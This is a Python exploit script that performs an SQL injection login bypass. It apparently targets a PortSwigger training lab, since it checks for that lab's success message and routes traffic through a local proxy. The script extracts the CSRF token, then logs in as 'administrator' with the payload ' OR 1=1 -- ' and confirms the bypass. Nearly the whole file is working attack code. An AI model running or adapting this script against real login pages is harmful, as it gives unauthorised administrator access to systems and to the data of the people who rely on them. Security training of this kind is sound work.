import sys
import argparse
import logging
import urllib3
import re
import time

import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HEADERS = {
    "X-Pwnfox-Color":"magenta"
}

PROXIES = {
    "http": "127.0.0.1:8080",
    "https":"127.0.0.1:8080"
}

SQLI_PAYLOAD = "' OR 1=1 -- "

# payload1 = {
#     "csrf":"oOAnwzGABAVq2wdKWKfzRFpUHX5V4KME",
#     "username":"administrator",
#     "password":"'"
# }

# payload2 = {
#     "csrf":"oOAnwzGABAVq2wdKWKfzRFpUHX5V4KME",
#     "username":"administrator",
#     "password": "' OR 1=1 -- "
# }


logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


# def extract_csrf(html):
#     match = re.search(
#         r'<input[^>]+name=["\']csrf["\'][^>]+value=["\']([^"\']+)["\']',
#         html,
#         re.IGNORECASE
#     )
#     if not match:
#         logger.error("CSRF token not found in HTML")
#         exit(1)
#     return match.group(1)
def extract_csrf(html):
    soup = BeautifulSoup(html, "html.parser")

    csrf_input = soup.find("input", attrs={"name": "csrf"})

    if not csrf_input:
        print("[!] CSRF input not found. Dumping HTML snippet:\n")
        print(html)
        exit(1)

    return csrf_input.get("value")

def exploit(url: str, no_proxy):

    session = requests.Session()


    if not no_proxy:
        session.proxies.update(PROXIES)

    session.verify = False

    session.headers.update(HEADERS)

    logger.info("sending a GET request to recieve CSRF token")

    resp = session.get(url+"login")

    csrf = extract_csrf(resp.text)
    logger.info(f"csrf token extracted: {csrf}")

    payload = {
        "csrf": csrf,
        "username":"administrator",
        "password": SQLI_PAYLOAD
    }

    logger.info("sending login payload")

    resp = session.post(url+"login",data=payload,allow_redirects=False)

    if resp.status_code == 302:
        time.sleep(2)
        r = session.get(url+"my-account")

        if "Congratulations, you solved the lab!" in r.text:
             logger.info("✅ SQLi login bypass confirmed")
        else:
            logger.info("probing again...")
            time.sleep(2)
            r = session.get(url)
            if "Congratulations, you solved the lab!" in r.text:
                 logger.info("✅ SQLi login bypass confirmed")
            else:
                logger.info("❌ bypass failed!")


def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-n", "--no-proxy", help="to not use any proxy", default=False, action="store_true")
    parser.add_argument("url", help="vulnerable url")
    return parser.parse_args()

def normalize_url(url: str):
    if not url.endswith("/"):
        url = url + "/"
        return url
    return url

if __name__ == "__main__":
    args = parse()
    exploit(normalize_url(args.url),args.no_proxy)



